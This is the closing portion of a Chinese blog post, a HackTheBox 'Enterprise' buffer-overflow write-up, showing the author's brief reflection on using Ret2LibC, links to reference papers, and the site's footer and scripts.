+<h2 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h2><p>&emsp;&emsp;这道题防护机制没有，还是可以采取类似 Sneaky 的方式进行溢出，这里我们选择了演示 Ret2LibC，不是太理解的，可以查看参考里的链接。很多地方我选择了以多个方式展示去获取一些东西，所以篇幅较长，见谅。</p>
+<p>&emsp;&emsp;这是一篇为了配合 Exploit 编写教程而专门打的靶机。因为那个教程太老了，虽然很多思路也用的上，但不是特别方便复现练习，所以自己也写个 跟着靶机 Writeup 学 BOF。在内容上很多地方只是说 我们下一步要怎么做，会附带一些解释，但没有特别详细的解释，详细的解释请查看 我的翻译文章：Exploit 编写教程。</p>
+<p>&emsp;&emsp;关于更新与集数：暂定 6 集，周更吧。根据实际情况再调整。这是第二集。</p>
+<hr>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>类似靶机推荐：</p>
+<p><a href="https://www.hackthebox.eu/home/machines/profile/158" target="_blank" rel="noopener">HackTheBox_Frolic</a></p>
+<p>Ret2LibC：</p>
+<p><a href="http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Return_to_libc/Return_to_libc.pdf" target="_blank" rel="noopener">http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Return_to_libc/Return_to_libc.pdf</a><br><a href="https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&amp;-return-to-libc-chaining-tutorial.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&amp;-return-to-libc-chaining-tutorial.pdf</a></p>
+<p><a href="http://www.b1ngda0.cn/2019/08/02/Exploit%E7%BC%96%E5%86%99%E6%95%99%E7%A8%8B%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9A%E5%9F%BA%E4%BA%8E%E6%A0%88%E7%9A%84%E6%BA%A2%E5%87%BA/">Exploit 编写教程第一部分：基于栈的溢出</a></p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-08-11T06:15:08.150Z" itemprop="dateUpdated">2019-08-11 14:15:08</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/08/11/跟着靶机Writeup学BOF-Enterprise/" target="_blank" rel="external">https://www.b1ngda0.cn/2019/08/11/跟着靶机Writeup学BOF-Enterprise/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.b1ngda0.cn">
+            <img src="/img/avatar.jpg" alt="B1ngDa0">
+            B1ngDa0
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackthebox/">hackthebox</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶机writeup/">靶机writeup</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.b1ngda0.cn/2019/08/11/跟着靶机Writeup学BOF-Enterprise/&title=《跟着靶机Writeup学BOF_Enterprise》 — 放荡不羁混世间&pic=https://www.b1ngda0.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.b1ngda0.cn/2019/08/11/跟着靶机Writeup学BOF-Enterprise/&title=《跟着靶机Writeup学BOF_Enterprise》 — 放荡不羁混世间&source=分享自己在网络安全方面的领悟，目前处于web安全以及靶机阶段" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/08/11/跟着靶机Writeup学BOF-Sneaky/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">跟着靶机Writeup学BOF_Sneaky</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#本文涉及知识点"><span class="post-toc-number">1.</span> <span class="post-toc-text">本文涉及知识点:</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#实战"><span class="post-toc-number">2.</span> <span class="post-toc-text">实战</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#信息收集"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">信息收集</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Get-User"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">Get User</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Get-Root"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">Get Root</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#个人感悟"><span class="post-toc-number">3.</span> <span class="post-toc-text">个人感悟</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#参考"><span class="post-toc-number">4.</span> <span class="post-toc-text">参考</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.b1ngda0.cn" target="_blank">HOME</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                B1ngDa0 &copy; 2019
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.b1ngda0.cn/2019/08/11/跟着靶机Writeup学BOF-Enterprise/&title=《跟着靶机Writeup学BOF_Enterprise》 — 放荡不羁混世间&pic=https://www.b1ngda0.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.b1ngda0.cn/2019/08/11/跟着靶机Writeup学BOF-Enterprise/&title=《跟着靶机Writeup学BOF_Enterprise》 — 放荡不羁混世间&source=分享自己在网络安全方面的领悟，目前处于web安全以及靶机阶段" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACuUlEQVR42u3aQXIiMRAEQP7/afu6EfYQVd2Sl0POiQAkJucgiep+veLr6+F6+s7TO/++/35s/umBCw8PD+/Qrf+80fejEkD+sJ5G5feMh4eHd5uXT51vBvkMOamdDQ8PD+9zeO8ZyVaRPKbZ48bDw8P7HF4eQLSj8geHh4eH9zm8JIxIgtT3o5LDd7v9HMta8PDw8GJeXkX6nNdX6nt4eHh466p6vihv5s8bBeq7xcPDw7vAm7UOtCWrfNHPH2LecICHh4d3lrdZppPyfw5o34kO/Xh4eHgXeLMB+eaRNwTkG0/bTICHh4d3lrd6KqOYtX00myM7Hh4e3g1eEpvOgoNZlJCMWnVG4OHh4a15efmqbbFql/5TB/1oCjw8PLxDvDwyaAtms+1k1hb2S2cEHh4e3lFeXspqbyhf1vOtZVZ4w8PDw7vNy2Htd/YhxSY+xsPDwzvFy4/OeVPUrHUg3xjyX8fDw8O7x5uV/Ddbwmt01aEzHh4e3h/yZpgktG0Di7YAhoeHh/c3vGSTaEti+ZxtEFwcxPHw8PCu8fKGgPznN4DNloOHh4d3mzc77LYBa1Ksahu2ihnw8PDwjvKSiZKFuI19W0bOe/zHgIeHh3eBVx9Vy6PwvlRW/wHAw8PDu8BrB+fNT7M2rFlrQlSWw8PDwzvKywfPFvp244kW+rxpDA8PD+8ybxbIbjaPtvmgLs7h4eHhXePlJa52cd8c2fMGhehjPDw8vDXvq7z26WjbQNBGFb+0DuDh4eEd5eVXPsVm6U+2llmIjIeHh3eW14YCbVybN7zmrVf5L+Lh4eHd481Cis3huA0d8jDiMcbFw8PD+0+82aqbx8SzUPjxfvDw8PA+gDdbxGcbQw6u62N4eHh4a94+jMhD2Laynx+jHzcGPDw8vKO8/R/+5PUmxm2P4Hh4eHjXeN/3d1sHWGRCOAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.2"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.2"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+</body>
+</html>
